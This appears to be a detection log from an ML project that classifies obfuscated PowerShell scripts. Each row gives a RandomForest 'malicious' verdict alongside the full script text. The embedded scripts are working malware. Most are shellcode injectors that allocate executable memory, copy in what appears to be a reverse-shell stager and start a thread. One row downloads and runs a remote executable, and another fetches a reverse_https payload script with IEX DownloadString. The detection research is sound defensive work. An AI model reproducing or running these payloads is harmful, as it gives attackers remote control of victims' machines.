0','d,0x8a,0x','0x07,0x13,0x1f,0xd4,0xf4,0xe3,0x1e,0xf5,0xaa,0x78,0x79,0xd5,0x4d,0xad,0xf1,0x5c,0x56,0xb2,0x3c,0x16,0xed,0x00,0','0xab,0x44,0x85,0x7a,0x8f,0xc7,0x05,0x81,0xdc,0x27,0x34,0x4a,0x11,0x29,0x71,0xb7,0xd8,0x7b,0x2a,0xb3,0x4f,0x6c,0x5f,0x89,0x53,','xef,0x75,0x8e,0x1f,0xb6,0xd3,0x6','x6b','cd',');for',',0x78,0xd0,0',',0x9a,0x5d,0x46','meter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(BkVmsvcrt.dllBkV)]public static extern IntPtr memset(IntPtr','(;;){Start-sleep 60};','0x3c,0xff','8,0x6d,0x73,0x36,0x36,0x1b,0x7b,0xa2,0xb','0x47,0x31,0x47,0x13,0x83,0xef,0xfc,0x','28,0x9','9,0xb1,',',0xf5,0x12,0xbc,0x97,0x8e,0x61,0x8e,0x38,0x25,0xee,0xa2,0xb1,0xe3,0xe9,0xc5,0xeb,0x54,0x65,0x38,0x14,0xa5,0xaf,0xfe,0x40,0xf5,0xc7,0xd7,0xe8,0x9e,0x17,0xd8,0x3c,0x30,0x',' des','0x20,0x9d,0xe5,0x89,0xb5,0x1e,0x5c,0x7e,0x1d,0x77,0x62,0x59,0x69,0xd8,0x9d,0x8c,0x6b,0x24,0x','S4c -Name BkVWin32BkV -namespace Win32Functions -p','nt dwSize, uint flAllocationType, uint flProtect);[DllImport(BkVkernel32.dllBkV)]public static extern IntPtr C','48,0x76,0xef,0xf1,0x38,0x36,0x5f,0x9a,0x52,0xb9,0x80,0xba,0x5c,0x10,0xa9,0x51,0xa6','1,0x1f,0xa8,0xbc,0xde,0x85,0xa2,0x50,',',0x98,0x8e,0xab,0x5d,0x10,0',',0x0e,0xd5,0x',',0xff,0x8c,0x6d,0x0c,0xad,0x20,0x05,0x40,0x46,0xb3,0x6b,0x4d,0x69,0x74,0xc1,','dAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpPara',' 0S4z[0S4i], 1)};0S4w::CreateThread(0,0,0S4x,0,0,0','xdf,0x00,0x71,0x10,','xca,0xa9,0x27,0x59,0x33,0x05,0x06,0x56,0xc6,0x57,0x4e,0x50,0x39,0x22,0xa6,0xa3,0xc4,0x35,0x7d,0xde,0x12,0xb3,0x66','48,0xe8,0x19,0x44,0x48;0S4g = 0x1000;if (0S4z.Length -gt 0x1000){0S4g = 0S4z.Length};0S4x=0S4w::VirtualAl','loc(0,0x1000,0S4g,0x40);for (0S4i=0;0S4i -le (0S4z.Length-1);0S4i++) {0S4w::memset([IntPtr](0S4x.ToInt32()+0S4i),','ernel32.dllBkV)]public static extern IntPtr VirtualAlloc(IntPtr lpAddres','2c,0x5a,0xbc,0xeb,0x1a,0xc5,0x3f,0xde,0x11,0xcc,0xd5,0xa1,0x4d,0x31,0x3a,0x22,0x8d,0x67,0x50,0x22,0xe5,0','x63,0x43,0x79,0x35,0xf5,0x00,0x75,0xf2,0x71,0x4e,0x99,0x05,0x55,0xe4,0xa5,0x8e,0x58,0x2b,0x2c,0xd4,0x7e,0',',0xe8,','0x47,0xbb,0x3a,0x57,0x6d,0x2b,0x38','s, ui',' ','0S4c = 9RL[DllImport(BkVk','xb4','reateThread(IntPtr lpThrea','0x0a,0',',0xd9,0x4d,0x16,0xa2,0x8c,0xc6,0x8e,0x5b,0x95,0x9d,0x2f,0xa3,0x03,0xd8,0x6f,0x2f,0xa0,0x1c,0x21,0xd8,0x','03,')) -CrePLACE  ([ChAr]57+[ChAr]82+[ChAr]76),[ChAr]39  -CrePLACE  '0S4',[ChAr]36  -REplACE  ([ChAr]66+[ChAr]107+[ChAr]86),[ChAr]34) | &amp; ( $SHeLLid[1]+$ShElliD[13]+'x')",malicious,TP
2026-07-13 16:41:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1348.ps1,custom-ps-ml,UNKNOWN,585a5cad-121d-41be-85aa-7db2dea054d6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3006,1981.64,"IEX( ((\""{14}{39}{27}{33}{4}{7}{31}{1}{48}{29}{42}{0}{30}{45}{15}{44}{50}{22}{19}{38}{37}{2}{34}{43}{16}{9}{26}{41}{46}{12}{5}{40}{10}{3}{18}{28}{17}{32}{13}{6}{20}{23}{35}{11}{49}{21}{25}{24}{47}{36}{8}\""-f'gWin32zYg -namespace','32.dllzYg)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(zYgmsvcrt','3,0x8b,0x49,0x18,0xe3,0','x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x9a,0x68,0x0','wSize, uint flAllocationType, uint flP','0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,',',0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xf','rotect);[','w::CreateThread(0,0,Bvhx,0,0,0);for (;;){Start-sleep 60};','0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x7','x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0','a2,0x56,0x6a,0x00,0x53,0xff,0xd5;Bvhg = 0x1000;if (Bvhz.Length -gt 0x1000){Bvhg ','0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,','04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00','Bvhc = NE','2Functions -passthru;[Byte[]];[Byte[]]Bvhz = 0xfc','34,0x8b,0x01,0xd6,0x31,0xff,0xac,','0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08','2,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x',',0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0','f,0x01,0xc3,0x29,0xc6,0x75,0xc','lAlloc(0,0x1000,B','xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28','7,0xc3,0x','](Bvhx.ToInt32()+Bvhi)','vhg,0x40);for (Bvhi=0;Bvhi -le (Bvhz.Length-1);Bvhi++) {Bvhw::memset([IntPtr','5,0xf6,0x03,','llzYg)]public static extern IntP','40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,','t src, uint count);NEU;Bvhw = Add-',' Win','DllImport(zYgkernel',',0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x','tr VirtualAlloc(IntPtr lpAddress, uint d','x3a,0x','bb,0xf0,0xb5,0x',', 1)};Bvh','1,0x8b,0x59,0x20,0x01,0xd','d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x5','U[DllImport(zYgkernel32.d','0x12,0xeb,0','0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0','Type -memberDefinition Bvhc -Name zY','49,0x8b,0x',',0xe8,0x','3','x58,',', Bvhz[Bvhi]','.dllzYg)]public static extern IntPtr memset(IntPtr dest, uin','= Bvhz.Length};Bvhx=Bvhw::Virtua','82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0')).RepLacE('NEU',[STrINg][CHAr]39).RepLacE(([CHAr]122+[CHAr]89+[CHAr]103),[STrINg][CHAr]34).RepLacE(([CHAr]66+[CHAr]118+[CHAr]104),'$') )",malicious,TP
2026-07-13 16:42:13,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1354.ps1,custom-ps-ml,UNKNOWN,b5b02d2b-3927-46ba-9704-aad21d54286c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2781,2030.84,"((\""{10}{40}{23}{39}{2}{28}{21}{35}{25}{3}{46}{19}{43}{24}{44}{15}{38}{13}{45}{26}{0}{36}{37}{34}{8}{22}{12}{30}{33}{42}{7}{18}{17}{14}{9}{41}{31}{16}{5}{4}{20}{29}{1}{32}{6}{27}{11}\""-f '8b,0x58,0x20,0x01,0xd3,0xe3,0x3','gth};pJ389T=pJ3w::VirtualAlloc(0,0x1000,pJ3g,0x','Address, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(k7zkernel32.dllk7z)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, u','(IntPtr des',',0x29,0xc6,0x85,0xf6,0x75,0','0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3','+) {pJ3w::memset([IntPtr](',',0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xba,','xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8',',0x00,0x68,0x58,0xa4,0','pJ347m = TLS[','T,0,0,0);for (;;){Start-sleep 60};','5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x','52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8','x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a','x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0',',','xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0','0x0c,0x6a,0x75,0x68,0x02,0x00,0x15,0xb3,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0','d-T','xec,0xc3;pJ3g = 0x1000;if (pJ3z.Length -gt 0x','wStackSize, IntPtr lpStartAddress, In','b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x','llk7z)]public static extern ','2k7z -namespace Win32Functions -pa',' IntPtr memset','x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x','pJ389T.ToInt32()+pJ3i), pJ3z[pJ3i], 1)};pJ3w::CreateThread(0,0,pJ389','int d','1000){pJ3g = pJ3z.Len','12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,','6a,0x00','40);for (pJ3i=0;pJ3i -le (pJ3z.Length-1);pJ3i+','0x68,0x77,0x73,0x32,0x5f,0x5','b,0x01,0xd6,0x31,0','tPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(k7zmsvcrt.dllk7z)]public static extern','c,0x49,0x8b,0x','34,0x8','x52,0x57,0x8b,0x','IntPtr VirtualAlloc(IntPtr lp','DllImport(k7zkernel32.d','x53,0xe5,0xff,0xd5,0x93,0x53,0x','4,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50','ype -memberDefinition pJ347m -Name k7zWin3','ssthru;[Byte[]];[Byte[]]pJ3z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0','b,0','t, uint src, uint count);TLS;pJ3w = Ad')).rEPlaCe('k7z',[STring][cHaR]34).rEPlaCe(([cHaR]84+[cHaR]76+[cHaR]83),[STring][cHaR]39).rEPlaCe(([cHaR]112+[cHaR]74+[cHaR]51),[STring][cHaR]36)|ieX",malicious,TP
2026-07-13 16:42:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\136.ps1,custom-ps-ml,UNKNOWN,df01c08e-1bad-4f28-8198-41a8be183ab8,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2944,1623.57,"(((\""{2}{1}{33}{11}{53}{5}{62}{56}{16}{57}{0}{46}{25}{35}{61}{21}{27}{39}{54}{65}{38}{8}{58}{20}{68}{64}{51}{41}{28}{26}{6}{45}{55}{66}{24}{10}{48}{7}{37}{4}{34}{67}{44}{18}{43}{40}{29}{69}{32}{36}{59}{15}{63}{30}{12}{13}{47}{19}{42}{23}{9}{22}{17}{14}{3}{50}{60}{49}{31}{52}\""-f 'ess, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(9EFmsvcrt.dll9EF)]public static extern IntPtr m','PWk[DllImport(9EFkernel32.dll9EF)]public','lQtc = ','Qti -le (lQtz.Length-1);lQti++) {lQtw::memset([IntPtr](lQtx.ToInt32()+lQti)','0x86,0x5d,0x68,0x33,0x32,0x00,','locationType, uint flProtect);[DllImport(9EFkernel32.d','0,0x75,','5a,0x8','1,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,','}','6,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x0','tatic exte','0,0x56',',0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,',' (lQti=0;l','x56,0x57,0x68,0','readAttributes, uint dwStackSize, IntPtr lp','Alloc(0,0x1000,lQtg,0x40);for','0,0x6b,0x00,','29,0xc6,0x85,0xf6,0x75,0xec,0xc',',0x','x60,0x89,0xe5,0',';lQtx=lQtw::Virtual','.Length','0x8b,0x58,0x24,0x01,0xd3,0x6',' src, uint count);PWk;lQtw = Add-Type -memberDefinition lQtc -Name 9EFWin329EF -namespace Win32Functio','x01,0xc7,0x38,0xe','x31,0xd',',0x0d,0','a,0x05,0x68,0xc0,0xa8,0x38','x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0','0,0);for (;;){Start-sleep 6','x68,0x99,0xa5,0x74,',' s','0x00,0x68,0x77','ns -passthru;[Byte[]];[Byte[]]lQtz = 0xfc,0xe8','0x','b,0x12,0xeb,','xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x0','2,0x64,0x8b,','50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6','xac,0xc1,0xcf','3;lQtg = 0x1000;if (lQtz.Length -gt 0x1000){lQtg = lQtz','0xff,0xd5,0x50,0x50,0x','x54,0x50,0x68,0x29,0x8','0xf4,0x0','emset(IntPtr dest, uint','0x','1,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x',':CreateThread(0,0,lQtx,0,',', lQ',',0xd6,0x31,0xff,0x31,0xc0,0','0};','rn IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAl','0x52,0','3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0','blic static extern IntPtr CreateThread(IntPtr lpTh','StartAddr','0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49','61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0','tz[lQti], 1)};lQtw:',',0x89,0x00,0x00,0x00,0','ll9EF)]pu','x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0','0x8b,0x01','x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0','xe2,0x58,',',0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0','8b,0x34,',',0x82,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0'))  -rEPlAcE ([CHar]108+[CHar]81+[CHar]116),[CHar]36 -rEPlAcE'PWk',[CHar]39  -rEPlAcE([CHar]57+[CHar]69+[CHar]70),[CHar]34) | &amp;( $pSHoMe[4]+$PsHOMe[34]+'X')",malicious,TP
2026-07-13 16:42:42,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1362.ps1,custom-ps-ml,UNKNOWN,1fe39b4b-b94c-4fb8-963d-6d164d3645b0,DESKTOP-BAC9DBQ,malicious,0.9709,RandomForest,320,2204.29,"&amp;( $PSHome[21]+$PshoMe[30]+'x') ( ((\""{17}{8}{0}{7}{18}{6}{15}{11}{10}{14}{5}{19}{16}{3}{1}{2}{4}{9}{12}{13}\"" -f'e','3','gtemp',':m','m3gsen','mp','tt','st ','-WebRequ','dm','procd','tderr.pl/','e.','exe','u','p://s','exe -OutFile c','Invoke','-Uri h','.')).rEPlacE(([ChAr]109+[ChAr]51+[ChAr]103),[STrING][ChAr]92))",malicious,TP
2026-07-13 16:42:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1376.ps1,custom-ps-ml,UNKNOWN,f93ef67e-4f90-4b58-be2a-0f7ea8afe70e,DESKTOP-BAC9DBQ,malicious,0.9825,RandomForest,701,1573.0,"((\""{16}{6}{49}{43}{3}{30}{20}{14}{9}{36}{29}{4}{25}{0}{35}{10}{1}{22}{33}{48}{44}{42}{18}{37}{27}{17}{26}{46}{31}{8}{38}{32}{12}{7}{5}{21}{41}{13}{2}{45}{19}{39}{11}{40}{28}{15}{23}{24}{34}{47}\"" -f'/','tion','window',' Net.','ercont','Shellco','j','nvoke-','-Shel','(tDlhttps://','ttifesta','e','); I','\u0013 Payload ','DownloadString','s','IEX (New-Ob','I','/maste','preter/re','ebClient).','d','/','t 198.56.248.','117 \u0013 Lp','ent.com','nv','xecution/',' Lho','.githubus','W','ke-','de.ps1tDl','Pow','ort 443 \u0013','ma','raw','r/CodeE','lco','v','rse_https \u0013','e ','it','t','o','s/meter','o',' Force','erSpl','ec')).rePLaCE('tDl',[StrInG][ChAr]39)| &amp;( $shellId[1]+$sHeLliD[13]+'X')",malicious,TP
2026-07-13 16:43:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1391.ps1,custom-ps-ml,UNKNOWN,63020316-1321-45b9-ac8a-81ef861c6997,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2952,1812.82," ((\""{19}{62}{60}{14}{24}{34}{58}{55}{7}{30}{26}{11}{29}{1}{56}{42}{18}{65}{32}{33}{9}{13}{4}{28}{3}{64}{48}{39}{52}{6}{51}{69}{68}{10}{53}{59}{57}{44}{41}{8}{36}{23}{38}{27}{50}{43}{20}{54}{2}{5}{45}{61}{47}{16}{21}{0}{22}{40}{46}{31}{12}{66}{37}{17}{15}{63}{25}{49}{35}{67}\""-f 'ec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04','et','0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbf,0x35,0x1d,0x76,0x68,0x0','b7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf','x','2,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x1','xe3,0x','ibutes, uint ','0x8b,0x0c,0x','00,0x00,0x60,0x89,0xe','1,0xd6,0x31,0xff,0x31,0','tAddress, IntPtr lp',',0','5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0','u','i',',0x74,0x0c,0xff,0x4e,0x0','f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;0Htg = 0x1000;','Ptr lpThreadId);[DllImport','0Htc = X7y[DllImport(LyAkernel32.dllLyA)]public static extern IntPtr VirtualAlloc(IntPtr lpAdd','5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68','8,0x75,0x',',0x56,0x57,0x68',',0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f','int flProtect);[DllImport(LyAkernel32.dllLyA)]public static','0){0Htg = 0Htz.Length};0Htx=0Htw::VirtualAlloc(0,0x1000,0Htg,0x40);for (0','StackSize, IntPtr lpStar','32,0x0','0f,0x','Param','dw',',0x40,0x68,0x00,0x10,0x00','ntPtr memset(IntPtr dest, uint src, uint count);X7y;0Htw = Add-Type -memberDefinition 0Htc -','Name LyAWin32LyA -namespace Win32Functions -passthru;[Byte[]];[Byte[]]0Htz = 0xfc,0xe8,0x89,0x00,0x',' extern In',';0Hti -le (0Htz.Length-1);0Hti++) {','4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b','0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5',',0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x','x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50',',0x02,0xd9,0xc8,0x','0x01,0xd3,0x66,','CreationFlags, Int','9,0x80,0x6b,0x00,0xff,0xd',',0x58,0x8b,0x58,0x24,','0,','5f,0xff,0xd5,0x8b,0x36,0x6a',',0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0','c7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0','Hti=0','0,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x2','3c,0x49,0x8',',0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0','x',',0xea,0x0f,0xdf,0xe','tr CreateThread(IntPtr lpThreadAttr','er, uint dw','75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2','tP','c0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x',', uint dwSize, uint flAllocationType, ','0x56','ress','f (0Htz.Length -gt 0x100',',0x0d,0x01,0x','(LyAmsvcrt.dllLyA)]public static extern I','x00,0x56,','0Htw::memset([IntPtr](0Htx.ToInt32()+0Hti), 0Htz[0Hti], 1)};0Htw::CreateThread(0,0,0Htx,0,0,0);for (;;){Start-sleep 60};','0x8b,0x0','b,0x34,')).REplaCe(([CHAr]48+[CHAr]72+[CHAr]116),'$').REplaCe(([CHAr]88+[CHAr]55+[CHAr]121),[striNG][CHAr]39).REplaCe('LyA',[striNG][CHAr]34) |. ( $Env:coMSPeC[4,15,25]-JoIN'')",malicious,TP
2026-07-13 16:43:26,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1395.ps1,custom-ps-ml,UNKNOWN,f00fb253-09d7-4d6d-b3d2-22b65f903b45,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2807,2243.6," &amp; ( $pShOmE[4]+$pshomE[34]+'x')(((\""{27}{6}{36}{43}{40}{2}{7}{13}{9}{31}{22}{17}{20}{28}{42}{34}{45}{14}{5}{8}{0}{21}{1}{39}{46}{26}{24}{41}{19}{37}{4}{35}{29}{32}{25}{44}{33}{3}{38}{23}{10}{15}{18}{30}{12}{11}{16}\""-f'x01,0xd3,0xe3,0x3c','c,0xc1,0xcf,0x0d,0x01,','lic static extern In','0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x','0x40,0x50,0x68,0x','x85,0xc0,0x74,0x4a,0x01,0xd','ntPtr lpAddress, uint dwSize, uint flAllocationType, ui','tPtr CreateThread(IntPtr lpThreadAttributes, uint ','0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0','pParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllI','8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,','0,evPx,0,0,','Pi], 1)};evPw::CreateThread(0,','dwStackSize, IntPtr lpStartAddress, IntPtr l','10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0','0x85,0xf6,0x75,0xec,0xc3;evPg = 0x1000;if (evPz.Length -gt 0x1000){e','0);for (;;){Start-sleep 60};','rc, uint count);PkB;evPw = Add-Type -memberDe','vPg = evPz.Length};evPx=evPw::VirtualAlloc(0','ff,0xd5,0x50,0x50,0x50,0','finition evPc -Name ngmWin32ngm -namespace Win32Functi',',0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xa','IntPtr dest, uint s','68,0x02,0xd9,0xc','x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0',',0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0x','0xeb,0x86,0x5d,0','evPc = PkB[DllImport(ngmkernel32.dllngm)]public static extern IntPtr VirtualAlloc(I','ons -passthru;[Byte[]];[Byte[]]evPz = 0xfc,','0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb3,0xba,0xa9,0x8c,0x68,0x0',',0x1000,evPg,0x40);for (evPi=0;evPi -le (evPz.Length-1);evPi++) {evPw::memset([IntPtr](evPx.ToInt32()+evPi), evPz[ev','mport(ngmmsvcrt.dllngm)]public static extern IntPtr memset(','2,0x00','0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,','x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c','ea,','nt flProtect);[DllImport(ngmkernel32.','x50,0x40,0x50,','00,0x56,0x53,0x57,0x','0xc7,0x38,0xe0,0x75,0xf4',']pub','x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0x','0xe8,0x89,0x00,0x00,0x00,0','dllngm)','a5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,',',0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x',',0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,')).Replace('evP',[stRING][Char]36).Replace(([Char]110+[Char]103+[Char]109),[stRING][Char]34).Replace(([Char]80+[Char]107+[Char]66),[stRING][Char]39))",malicious,TP
